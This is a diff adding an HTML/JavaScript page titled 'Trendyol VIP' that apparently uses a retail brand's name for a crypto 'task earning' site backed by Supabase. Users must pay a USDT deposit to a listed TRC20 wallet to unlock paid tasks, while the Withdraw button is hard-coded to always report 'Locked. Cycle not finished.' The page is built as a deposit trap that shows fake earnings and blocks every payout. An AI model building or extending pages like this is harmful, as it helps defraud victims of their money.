@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" id="html-tag">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trendyol VIP - Global Partners</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        :root { --primary: #f27a1a; --dark: #111; --gold: #c5a059; --green: #27ae60; --red: #e74c3c; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f6; margin: 0; padding: 0; }
+        #auth-screen { position: fixed; inset: 0; background: white; z-index: 2000; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .box { width: 100%; max-width: 350px; text-align: center; }
+        .input-field { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; width: 100%; box-sizing: border-box; }
+        #main-app { display: none; }
+        .header { background: var(--dark); color: white; padding: 30px 20px; text-align: center; position: relative; border-bottom: 4px solid var(--gold); }
+        .balance-val { font-size: 36px; font-weight: bold; color: var(--gold); }
+        .btn-wallet { padding: 10px 20px; border: none; border-radius: 5px; color: white; cursor: pointer; font-weight: bold; flex: 1; }
+        .task-card { background: white; border-radius: 12px; padding: 15px; margin-bottom: 12px; display: flex; gap: 15px; align-items: center; border-left: 6px solid var(--primary); box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        [dir="rtl"] .task-card { border-left: none; border-right: 6px solid var(--primary); }
+        .btn-confirm { background: var(--primary); color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); align-items: center; justify-content: center; z-index: 3000; padding: 20px; }
+        .modal-content { background: white; padding: 25px; border-radius: 20px; text-align: center; width: 100%; max-width: 400px; }
+        .lang-switch { position: absolute; top: 10px; right: 10px; background: transparent; color: white; border: 1px solid white; padding: 5px; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div id="auth-screen">
+        <div class="box">
+            <h1 style="color: var(--primary);">Trendyol VIP</h1>
+            <input type="email" id="email" class="input-field" placeholder="Email">
+            <input type="password" id="password" class="input-field" placeholder="Password">
+            <button class="btn-confirm" onclick="handleAuth('login')">Login</button>
+            <button class="btn-confirm" style="background:#444;" onclick="handleAuth('signup')">Create Account</button>
+        </div>
+    </div>
+    <div id="main-app">
+        <div class="header">
+            <button class="lang-switch" onclick="toggleLang()">AR / EN</button>
+            <div id="bal-text">Total Balance (USDT)</div>
+            <div class="balance-val">$ <span id="balance">0.00</span></div>
+            <div style="display:flex; gap:10px; margin-top:15px; justify-content:center;">
+                <button class="btn-wallet" style="background:var(--green);" onclick="showModal('deposit')">Deposit</button>
+                <button class="btn-wallet" style="background:var(--red);" onclick="showModal('withdraw')">Withdraw</button>
+            </div>
+        </div>
+        <div class="container" style="padding: 20px;">
+            <div id="tasks-list"></div>
+            <div id="day-finished" style="display:none; text-align:center; padding:30px;">
+                <h3>All tasks completed for today! ✅</h3>
+            </div>
+        </div>
+    </div>
+    <div id="op-modal" class="modal">
+        <div class="modal-content">
+            <h3 id="modal-title"></h3>
+            <div id="modal-body"></div>
+            <button class="btn-confirm" onclick="closeModal()">Close</button>
+        </div>
+    </div>
+<script>
+    const supabaseUrl = 'https://setalptyphrhbjcwmhoq.supabase.co';
+    const supabaseKey = 'sb_publishable_P8QbHZQxsaAKYFTpQVU_Gw_1QU5DHas';
+    const _supabase = supabase.createClient(supabaseUrl, supabaseKey);
+    let currentUser = null; let userData = {};
+    async function handleAuth(type) {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const { data, error } = (type === 'signup') 
+            ? await _supabase.auth.signUp({ email, password })
+            : await _supabase.auth.signInWithPassword({ email, password });
+        if (error) alert(error.message);
+        else {
+            if(type === 'signup') {
+                await _supabase.from('profiles').insert([{ id: data.user.id, username: email.split('@')[0] }]);
+                alert("Account created! Now please Login.");
+            } else { loadAppData(data.user); }
+        }
+    }
+    async function loadAppData(user) {
+        currentUser = user;
+        const { data } = await _supabase.from('profiles').select('*').eq('id', user.id).single();
+        if (data) {
+            userData = data;
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('main-app').style.display = 'block';
+            updateUI();
+        }
+    }
+    function renderTasks() {
+        const list = document.getElementById('tasks-list');
+        list.innerHTML = '';
+        if (userData.tasks_completed >= 10) { document.getElementById('day-finished').style.display = 'block'; return; }
+        for (let i = userData.tasks_completed; i < 10; i++) {
+            list.innerHTML += `<div class="task-card"><div><h4>Task #${301 + i}</h4><span style="color:var(--green); font-weight:bold;">Profit: +$4.44</span><button class="btn-confirm" onclick="submitTask(${i})">Submit</button></div></div>`;
+        }
+    }
+    async function submitTask(id) {
+        if (!userData.is_vip) { showModal('deposit'); return; }
+        const newBal = userData.balance + 4.44;
+        const newCount = userData.tasks_completed + 1;
+        const { error } = await _supabase.from('profiles').update({ balance: newBal, tasks_completed: newCount }).eq('id', currentUser.id);
+        if(!error) { userData.balance = newBal; userData.tasks_completed = newCount; updateUI(); }
+    }
+    function updateUI() { document.getElementById('balance').innerText = userData.balance.toFixed(2); renderTasks(); }
+    function showModal(type) {
+        document.getElementById('op-modal').style.display = 'flex';
+        const title = document.getElementById('modal-title'); const body = document.getElementById('modal-body');
+        if(type === 'deposit') {
+            title.innerText = "VIP Deposit";
+            body.innerHTML = "Send USDT (TRC20) to:<br><b>TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg</b>";
+        } else { title.innerText = "Withdraw"; body.innerText = "Locked. Cycle not finished."; }
+    }
+    function closeModal() { document.getElementById('op-modal').style.display = 'none'; }
+    function toggleLang() { /* Language Toggle Logic */ }
+</script>
+</body>
+</html>
